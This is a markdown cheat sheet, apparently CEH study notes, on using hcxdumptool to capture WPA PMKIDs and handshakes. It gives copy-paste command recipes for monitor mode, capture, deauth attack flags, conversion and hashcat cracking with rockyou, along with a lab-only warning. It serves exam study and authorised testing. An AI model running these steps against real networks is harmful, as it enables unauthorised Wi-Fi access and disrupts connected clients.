# hcxdumptool — clientless WPA/PMKID capture

> **The modern wireless capture tool.** Captures the PMKID from the first frame of a WPA/WPA2 association — *no client deauth, no 4-way handshake needed*. Pairs with [hcxpcapngtool](hcxpcapngtool.md) to convert pcapng → hashcat 22000. Replaces `aireplay-ng -0` + `airodump-ng` for PMKID attacks. Essential for CEH v12/v13 wireless Qs.

**Install check (Parrot — usually present):** `hcxdumptool -v`
**Install if missing:** `sudo apt install hcxdumptool hcxtools`

**Needs root** (raw 802.11).

---

## 🎯 Cheat-flow: "I need a WPA hash, no clients associated"

| Step | Command | Why |
|---|---|---|
| 1. Kill conflicting daemons | `sudo airmon-ng check kill` | NetworkManager/wpa_supplicant steal the radio |
| 2. Monitor mode | `sudo ip link set wlan0 down; sudo iw dev wlan0 set type monitor; sudo ip link set wlan0 up` | or `sudo airmon-ng start wlan0` |
| 3. **Capture PMKIDs + EAPOLs** | `sudo hcxdumptool -i wlan0mon -w capture.pcapng --enable_status=1` | Grabs everything on all channels |
| 4. Convert for hashcat | `hcxpcapngtool -o hash.22000 capture.pcapng` | PCAPNG → hashcat 22000 |
| 5. Crack | `hashcat -m 22000 hash.22000 rockyou.txt` | GPU crack |

---

## 🔑 Flags you must know cold

| Flag | Meaning |
|---|---|
| `-i <iface>` | Monitor-mode interface (e.g. `wlan0mon`) |
| `-w <file>` | **Output pcapng file** |
| `-c <ch[,ch2]>` | Lock to specific channel(s) — speed boost if you know the AP |
| `--enable_status=1` | Verbose status line (see what's being captured) |
| `--enable_status=15` | All status events (EAPOL, PMKID, deauth, beacon) |
| `--filterlist_ap=<file>` | Only capture from APs in this BSSID file |
| `--filtermode=2` | `1` = ignore listed, `2` = target listed only |
| `--filterlist_client=<file>` | Client MAC filter |
| `--rds=1` | Real-time display sort by RSSI |
| `--disable_deauthentication` | Purely passive — no client disruption |
| `--disable_beacon` | Skip beacon capture (smaller pcapng) |
| `--active_beacon` | Probe hidden SSIDs actively |
| `--use_gpsd` | Log GPS with capture (wardriving) |
| `-t <sec>` | Exit after N seconds |
| `-F` | Capture on all frequencies (2.4 + 5 GHz if radio supports) |

### Attack mode flags (aggressive)

| Flag | Effect |
|---|---|
| `--attemptclientattack=1` | Deauth clients to force 4-way handshake if PMKID fails |
| `--attemptapattack=1` | Deauth AP |
| `--givemeahash` | Shorthand: be noisy, get any hash |

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Full workflow — kill, monitor, capture, stop with Ctrl+C
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -w capture.pcapng --enable_status=1
# Ctrl+C after a few minutes

# 2. Target a specific AP (BSSID filter)
echo "aa:bb:cc:dd:ee:ff" > target.txt
sudo hcxdumptool -i wlan0mon -w capture.pcapng \
  --filterlist_ap=target.txt --filtermode=2 --enable_status=1

# 3. Lock to one channel (faster when AP is known)
sudo hcxdumptool -i wlan0mon -c 6 -w capture.pcapng --enable_status=1

# 4. Passive only (no deauth, no active probe)
sudo hcxdumptool -i wlan0mon -w capture.pcapng \
  --disable_deauthentication --enable_status=1

# 5. Time-boxed capture (2 minutes)
sudo hcxdumptool -i wlan0mon -t 120 -w capture.pcapng --enable_status=1

# 6. Convert + crack
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

---

## 🎯 CEH exam patterns

**"Capture a PMKID without deauthenticating clients":**
```bash
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --disable_deauthentication --enable_status=1
hcxpcapngtool -o hash.22000 pmkid.pcapng
```

**"Crack the WPA key for SSID 'CorpWiFi'":**
1. `hcxdumptool` capture
2. `hcxpcapngtool -o hash.22000 capture.pcapng`
3. `hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule`
4. `hashcat -m 22000 hash.22000 --show` → copy PSK after `:`

---

## ⚠️ Gotchas

- **Needs monitor mode first.** If `airmon-ng start wlan0` doesn't work, do it manually with `iw dev`. Some cards need `airmon-ng check kill` to release wpa_supplicant.
- **"failed to open interface" / EPERM** → driver doesn't support monitor/injection. Check with `iw list | grep -A6 Supported`.
- **Not every AP is PMKID-vulnerable.** Newer WPA2/WPA3 APs disable PMKID roaming optimization. If you get no PMKID after 5 min, switch to EAPOL mode with `--attemptclientattack=1` or use aireplay-ng deauth + airodump-ng.
- **Output is pcapng, not pcap.** Old tools won't parse it — always go through `hcxpcapngtool`.
- **WPA3 / SAE** is NOT crackable with 22000 — it uses a different exchange (SAE). hcxdumptool captures it but hashcat can't break it offline.
- **PMF (802.11w)** blocks deauth-based attacks but PMKID still works if the AP allows it.
- **Don't run against networks you don't own.** CEH lab targets only.
- **File grows fast** on `-F` (both bands + all channels). Limit with `-t` or `-c`.

---

## 🔗 Related

- [hcxpcapngtool](hcxpcapngtool.md) — pcapng → hashcat 22000 converter
- [hashcat](hashcat.md) — crack the resulting hash (`-m 22000`)
- [airmon-ng](airmon-ng.md) — enable monitor mode
- [airodump-ng](airodump-ng.md) — classic alternative for EAPOL capture
- [aireplay-ng](aireplay-ng.md) — deauth to force handshake if PMKID fails
- [wifite](wifite.md) — automates this whole flow
- [14-wireless domain README](../14-wireless/README.md)
